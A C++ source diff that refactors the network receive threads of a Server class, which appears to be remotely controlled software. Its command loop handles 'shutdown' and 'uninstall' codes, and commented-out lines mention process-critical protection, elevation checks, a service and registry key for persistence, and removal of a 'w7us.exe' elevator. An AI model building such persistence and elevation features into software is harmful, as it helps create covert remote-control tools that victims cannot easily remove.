@@ -30,6 +30,46 @@ int Server::receive(PARSER p)
     return rc;
 }
 
+//Thread created to loop for receiving data.
+//recvfunc() actually loops, this just starts that loop and receives its output
+void *Server::waitForRecvFunc(void * v) {
+    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);
+
+    while (true) {
+        int exit_code = p->s->receive_low(p->p);
+
+        /*
+        printf("waitForRecvFunc: ");
+
+        char exit_char[10];
+        itoa(exit_code, exit_char, 10);
+        printf("%s", exit_char);
+        printf("\n");
+        */
+        if (exit_code == 2) {	//if the 'shutdown' command is received
+            //exit(0); //TODO: THIS IS DIRTY
+            //return 2;
+        }
+        if (exit_code == 3) {
+            /*
+            if (!IsElevated()) {
+                set_process_critical(FALSE);
+            }
+            */
+        }
+        if (exit_code == 4) {	//if the 'uninstall' command was received
+            //protect_service = false; //Possibly deprecated
+            //set_process_critical(FALSE);	//remove possible process protection
+            //testPort(2); //release the testPort() mutex
+            //Sleep(6000);
+            //CreateMyService("", FALSE);	//uninstall service
+            //setRegKey(FALSE);	//remove possible registry key for servicemode
+            //remove("w7us.exe");		//remove elevator
+            //return 2;
+        }   
+    }
+}
+
 int Server::receive_low(PARSER p) {
     char recvbuf[DEFAULT_BUFLEN];
     memset(recvbuf, '\0', sizeof(recvbuf));
@@ -118,46 +158,6 @@ int Server::receive_low(PARSER p) {
     }
 
     return ret;
-}
-
-//Thread created to loop for receiving data.
-//recvfunc() actually loops, this just starts that loop and receives its output
-void *Server::waitForRecvFunc(void * v) {
-    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);
-
-    while (true) {
-        int exit_code = p->s->receive_low(p->p);
-
-        /*
-        printf("waitForRecvFunc: ");
-
-        char exit_char[10];
-        itoa(exit_code, exit_char, 10);
-        printf("%s", exit_char);
-        printf("\n");
-        */
-        if (exit_code == 2) {	//if the 'shutdown' command is received
-            //exit(0); //TODO: THIS IS DIRTY
-            //return 2;
-        }
-        if (exit_code == 3) {
-            /*
-            if (!IsElevated()) {
-                set_process_critical(FALSE);
-            }
-            */
-        }
-        if (exit_code == 4) {	//if the 'uninstall' command was received
-            //protect_service = false; //Possibly deprecated
-            //set_process_critical(FALSE);	//remove possible process protection
-            //testPort(2); //release the testPort() mutex
-            //Sleep(6000);
-            //CreateMyService("", FALSE);	//uninstall service
-            //setRegKey(FALSE);	//remove possible registry key for servicemode
-            //remove("w7us.exe");		//remove elevator
-            //return 2;
-        }   
-    }
 }
 
 int Server::connectTCP(std::string hostname, std::string port)
@@ -256,12 +256,25 @@ void Server::sendUDP(std::string buf)
     }
 }
 
-void Server::receiveUDPThread() {
+int Server::receiveUDP(PARSER p)
+{
+    STRCT.p = p;
+    STRCT.s = this;
+    int rc = pthread_create(&receiveUDPThreads[0], NULL, &Server::waitForUDPFunc, &STRCT);
+    if (rc) {
+        std::cout<<"THREAD CREATION FAILED\n";
+    }
+}
+
+void *Server::waitForUDPFunc(void * v)
+{
+    PARSESTRUCT *p = static_cast<PARSESTRUCT*>(v);
+
     int s = 0;
     try {		//Backup in case we crash somewhere
         int return_val = 0;
         while (return_val != -1) {
-            return_val = this->receiveUDP();
+            return_val = p->s->receiveUDP_low(p->p);
         }
     }
     catch (int e) {		//catch for the try/catch
@@ -271,26 +284,20 @@ void Server::receiveUDPThread() {
     std::cout<<"UDP RETURNED\n";
 }
 
-void *Server::receiveUDPThreadHelper(void *context)
-{
-    ((Server *)context)->receiveUDPThread();
-}
-
-int Server::receiveUDP()
-{
-	bool streamingUDP = true;
+int Server::receiveUDP_low(PARSER p) {
+    bool streamingUDP = true;
 
 	//start communication
 	std::string temp_str;
     while(streamingUDP)
     {
-        char buf[1024];
+        char buf[BUFLEN];
         //receive a reply and print it
         //clear the buffer by filling null, it might have previously received data
         memset(buf,'\0', BUFLEN);
         struct sockaddr_in from;
         unsigned int length;
-        int n = recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from, &length);
+        int n = recvfrom(sock, buf, BUFLEN, 0, (struct sockaddr *)&from, &length);
         if (n < 0)
         {
             errorLite("recvfrom");
